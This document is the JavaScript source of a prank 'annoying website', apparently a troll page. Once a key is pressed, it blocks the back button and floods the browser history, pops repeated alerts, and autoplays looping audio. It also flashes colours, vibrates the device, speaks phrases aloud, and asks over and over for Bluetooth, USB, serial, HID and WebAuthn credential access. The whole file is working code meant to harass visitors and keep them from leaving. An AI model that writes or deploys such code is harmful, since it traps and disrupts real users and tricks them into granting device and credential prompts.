const ART = [
    "{\\__/}\n" + "(●_●)\n" + "( > 🍪 Want a cookie?",
    "⠀⠀⠀⠀⠀⠀⠀⠀⢀⣞⣆⢀⣠⢶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀\n" +
      "⠀⢀⣀⡤⠤⠖⠒⠋⠉⣉⠉⠹⢫⠾⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n" +
      "⢠⡏⢰⡴⠀⠀⠀⠉⠙⠟⠃⠀⠀⠀⠈⠙⠦⣄⡀⢀⣀⣠⡤⠤⠶⠒⠒⢿⠋⠈⠀⣒⡒⠲⠤⣄⡀⠀⠀\n" +
      "⢸⠀⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⠴⠂⣀⠀⠀⣴⡄⠉⢷⡄⠚⠀⢤⣒⠦⠉⠳⣄⡀⠀\n" +
      "⠸⡄⠼⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⡂⠠⣀⠐⠍⠂⠙⣆⠀\n" +
      "⠀⠙⠦⢄⣀⣀⣀⣀⡀⠀⢷⠀⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⡇⠠⣀⠱⠘⣧\n" +
      "⠀⠀⠀⠀⠀⠀⠀⠈⠉⢷⣧⡄⢼⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⡈⠀⢄⢸⡄\n" +
      "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡀⠃⠘⠂⠲⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⡈⢘⡇\n" +
      "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢫⡑⠣⠰⠀⢁⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⣸⠁\n" +
      "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⠂⡀⢨⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡆⣾⡄⠀⠀⠀⠀⣀⠐⠁⡴⠁\n" +
      "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⡈⡀⢠⣧⣤⣀⣀⡀⢀⡀⠀⠀⢀⣼⣀⠉⡟⠀⢀⡀⠘⢓⣤⡞⠁\n" +
      "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⡁⢁⣸⡏⠀⠀⠀⠀⠁⠀⠉⠉⠁⠹⡟⢢⢱⠀⢸⣷⠶⠻⡇⠀⠀⠀\n" +
      "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⡏⠈⡟⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠁⠀⠻⣧⠀⠀⣹⠁⠀  \n" +
      "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡤⠚⠃⣰⣥⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠼⢙⡷⡻⠀⡼⠁⠀⠀⠀\n" +
      "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠟⠿⡿⠕⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⣾⠉⣹⣷⣟⣚⣁⡼⠁⠀⠀⠀\n" +
      "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    "⠀⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲⡀⠀\n" +
      "⠀⠀⠀⣴⠿⠏⠀⠀⠀⠀⠀ ⠀⢳⡀⠀ ⡏⠀⠀⠀⠀⠀⢷\n" +
      "⠀⠀⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀⣧⠀⢸⠀⠀⠀⠀⠀ ⡇\n" +
      "  ⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲⣿ ⣸  OK   ⡇\n" +
      "⠀⠀⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀⠀⣿⠀ ⢹⠀⠀⠀⠀⠀ ⡇\n" +
      "⠀⠀⠙⢿⣯⠄⠀⠀⠀⢀⡀⠀⠀⡿⠀⠀⡇⠀⠀⠀⠀⡼\n" +
      "⠀⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀⠀⠘⠤⣄⣠⠞⠀\n" +
      "⠀⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n" +
      "⠀⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀⠀⠀⠀⠀⠀⠀\n" +
      "⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿⠀⠀⠀⠀⠀⠀\n" +
      "⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀⠀⣄⢸⠀⠀⠀⠀⠀⠀\n" +
      "⣿⣿⣧⣀⣿.........⣀⣰⣏⣘⣆⣀⠀⠀",
    "⡿⢋⡿⠛⣡⣿⣿⡟⢉⣽⣟⢡⣿⣿⣿⣿⣿⣿⣿⡏⠰⠏⠽⠿⠿⣿⣿⣿⣿\n" +
      "⣶⠛⣀⣈⠩⠭⠤⠤⠴⢶⣶⣤⡐⢶⣶⣶⣶⣶⠆⣠⣶⠖⠒⠒⠒⠲⠦⣤⣤\n" +
      "⣤⣾⡟⣋⣠⡄⡀⣀⢀⡢⢌⣙⣿⡄⢻⣿⣿⠏⡸⠟⣩⢠⡀⠤⢠⡄⣲⣶⣿\n" +
      "⣿⡿⢷⣌⡛⠧⠤⠄⠘⣛⣂⣼⣿⡇⢠⣶⡆⠄⣿⡶⣦⣤⣤⣤⣴⣾⣿⣿⣿\n" +
      "⣿⣿⠦⠬⠉⠉⠙⠛⠿⣿⣿⣿⡟⠄⢹⣿⣿⡄⠸⣷⣦⣬⣭⣭⣤⣶⣶⣾⣿\n" +
      "⣿⣿⣿⣶⣶⣶⣶⣾⣿⣿⣿⠏⠄⠃⢸⣿⣿⣷⡄⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
      "⣤⣉⡛⠛⠛⠛⠛⠛⠛⣋⠠⠂⣰⠁⣾⣿⣿⣿⣿⣄⠄⠙⠻⠿⠿⠿⠟⠛⣉\n" +
      "⣿⣿⠛⣿⣿⣿⣿⠿⢋⣤⡆⢸⣿⡀⢿⣿⣿⣿⣿⣿⠄⣶⣦⣄⡐⠲⣿⡋⣿\n" +
      "⣿⣿⡄⣿⣿⣿⠋⣴⣿⣿⣷⣤⣉⡑⠈⢻⣿⣿⠟⢉⣴⣿⣿⣿⣿⣦⠘⣷⣿\n" +
      "⣿⣿⠄⣿⣿⠇⣼⢿⣿⣿⣿⠿⠿⠿⠷⢤⣤⣤⠾⠿⠛⢛⣉⠉⡉⢻⡇⢸⣿\n" +
      "⣿⣿⡆⢻⣿⠐⠄⡂⢀⣀⢐⡒⢒⠒⢒⠒⡒⠒⡒⢚⡉⣁⠰⠠⢀⣾⠇⣼⣿\n" +
      "⣇⢻⣷⡈⢿⡇⢰⣌⡐⠨⢐⠛⠸⠇⠿⠇⠿⠸⠿⠘⣃⣩⡴⢁⣾⣿⣄⡟⢠\n" +
      "⣿⡄⣿⣿⡄⢻⣿⡟⢿⣷⣦⣌⡙⠻⠿⠿⠿⠿⠿⠟⠛⣋⣠⣾⣿⣿⣿⠃⡼\n" +
      "⣿⣷⣿⣿⣿⠈⣿⣿⣦⣌⢻⣿⣿⣿⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣁⠊⣴",
  ],
  say = [
    "The wheels on the bus go round and round, round and round, round and round. The wheels on the bus go round and round, all through the town!",
    "Dibidi ba didi dou dou, Di ba didi dou, Didi didldildidldidl houdihoudi dey dou",
    "I like fuzzy kittycats, warm eyes, and pretending household appliances have feelings",
    "I've never seen the inside of my own mouth because it scares me to death.",
    "hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw",
    "abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz",
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak",
    "eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo",
  ],
  enter = document.getElementById("enter"),
  show = document.getElementById("show"),
  SCREEN_WIDTH = window.screen.availWidth,
  SCREEN_HEIGHT = window.screen.availHeight,
  WIN_WIDTH = 480,
  WIN_HEIGHT = 260,
  random = (arr) => arr[Math.floor(Math.random() * arr.length)],
  rancoords = () => {
    return {
      x:
        MARGIN +
        Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN)),
      y:
        MARGIN +
        Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN)),
    };
  };

let screenOn;

window.onkeydown = (e) => {
  e.preventDefault();
  !screenOn ? start() : alert("Chunga bunga?");
};

function start() {
  if (!screenOn) screenOn = true;
  else return;

  alert("be ready");
  emojiUrl();
  enter.style.opacity = "0";

  setInterval(() => {
    alert(random(ART));
  }, 3e4);
  setTimeout(() => {
    document.body.removeChild(enter);
    document.body.classList.add("gay");
    show.style.display = "block";
    document.querySelector("html").style = "cursor: none;";

    alert("wip, this site will be worse soon.");
    blockback();
    spam();
    vibrate();
    request();
  }, 500);
}

function blockback() {
  window.addEventListener("popstate", () => window.history.forward());
  window.addEventListener("beforeunload", (event) => {
    window.speechSynthesis.speak(
      new window.SpeechSynthesisUtterance("Please don't go!")
    );
    event.returnValue = true;
  });
}

function spam() {
  //fill history
  for (let i = 1; i < 20; i++) {
    window.history.pushState(
      {},
      "",
      window.location.pathname + "?suscount=" + i
    );
    //audio
    let audio = document.createElement("audio");
    audio.src = random([
      "static/music/amogus.mp3",
      "static/music/sussy.mp3",
      "static/music/cf-gurls.mp3",
    ]);
    audio.autoplay = true;
    audio.loop = true;
    setTimeout(() => {
      document.body.appendChild(audio);
    }, 200);
  }

  window.history.pushState({}, "", window.location.pathname);

  //theme color

  const meta = document.querySelector("meta.theme-color");
  setInterval(() => {
    let wdth = 6,
      num = Math.floor(Math.random() * 16777215).toString(16);
    wdth -= num.toString().length;

    meta.setAttribute(
      "content",
      "#" + new Array(wdth + (/\./.test(num) ? 2 : 1)).join("0") + num
    );
  }, 50);
}

function request() {
  try {
    navigator.bluetooth
      .requestDevice({ acceptAllDevices: !0 })
      .then((e) => e.gatt.connect());
  } catch (e) {}
  try {
    navigator.usb.requestDevice({ filters: [{}] });
  } catch (e) {}
  try {
    navigator.serial.requestPort({ filters: [] });
  } catch (e) {}
  try {
    navigator.hid.requestDevice({ filters: [] });
  } catch (e) {}
  if (!window.ApplePaySession)
    try {
      const e = {
          publicKey: {
            rp: { name: "Acme" },
            user: {
              id: new Uint8Array(16),
              name: "amongus@sus.com",
              displayName: "Sus Amongus",
            },
            pubKeyCredParams: [{ type: "public-key", alg: -7 }],
            attestation: "direct",
            timeout: 6e4,
            challenge: new Uint8Array([
              140, 10, 38, 255, 34, 145, 193, 233, 185, 78, 46, 23, 26, 152,
              106, 115, 113, 157, 67, 72, 213, 167, 106, 21, 126, 56, 148, 82,
              119, 151, 15, 239,
            ]).buffer,
          },
        },
        t = {
          publicKey: {
            timeout: 6e4,
            challenge: new Uint8Array([
              121, 80, 104, 113, 218, 238, 238, 185, 148, 195, 194, 21, 103,
              101, 38, 34, 227, 243, 171, 59, 120, 46, 213, 111, 129, 38, 226,
              166, 1, 125, 116, 80,
            ]).buffer,
          },
        };
      navigator.credentials.create(e).then((e) => {
        const a = [
          {
            id: e.rawId,
            transports: ["usb", "nfc", "ble"],
            type: "public-key",
          },
        ];
        return (t.publicKey.allowCredentials = a), navigator.credentials.get(t);
      });
    } catch (e) {}
}
function emojiUrl() {
  window.ApplePaySession ||
    random([
      function () {
        const o = ["🏻", "🏼", "🏽", "🏾", "🏿"];
        setInterval(() => {
          let n,
            t,
            e = "";
          for (n = 0; n < 10; n++)
            (t = Math.floor(
              o.length * ((Math.sin(Date.now() / 100 + n) + 1) / 2)
            )),
              (e += "👶" + o[t]);
          window.location.hash = e;
        }, 100);
      },
      function () {
        setInterval(() => {
          let o,
            n,
            t = "";
          for (o = 0; o < 10; o++)
            (n = Math.floor(4 * Math.sin(Date.now() / 200 + o / 2)) + 4),
              (t += String.fromCharCode(9601 + n));
          window.location.hash = t;
        }, 100);
      },
      function () {
        const o = ["🌑", "🌘", "🌗", "🌖", "🌕", "🌔", "🌓", "🌒"],
          n = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
        let t = 0;
        setInterval(() => {
          let e = "",
            a = 0;
          if (t) {
            for (; 0 === n[a]; ) a++;
            a >= n.length ? (t = 0) : (n[a]++, 8 === n[a] && (n[a] = 0));
          } else {
            for (; 4 === n[a]; ) a++;
            a >= n.length ? (t = 1) : n[a]++;
          }
          n.forEach(function (n) {
            e += o[n];
          }),
            (window.location.hash = e);
        }, 100);
      },
    ])();
}
function vibrate() {
  "function" == typeof window.navigator.vibrate &&
    (setInterval(() => {
      const t = Math.floor(600 * Math.random());
      window.navigator.vibrate(t);
      window.speechSynthesis.speak(
        new window.SpeechSynthesisUtterance(random(say))
      );
      request();
    }, 1e3),
    window.addEventListener(
      "gamepadconnected",
      ({ gamepad: a }) =>
        a.vibrationActuator &&
        setInterval(() => {
          a.connected &&
            a.vibrationActuator.playEffect("dual-rumble", {
              duration: Math.floor(600 * Math.random()),
              strongMagnitude: Math.random(),
              weakMagnitude: Math.random(),
            });
        }, 1e3)
    ));
}
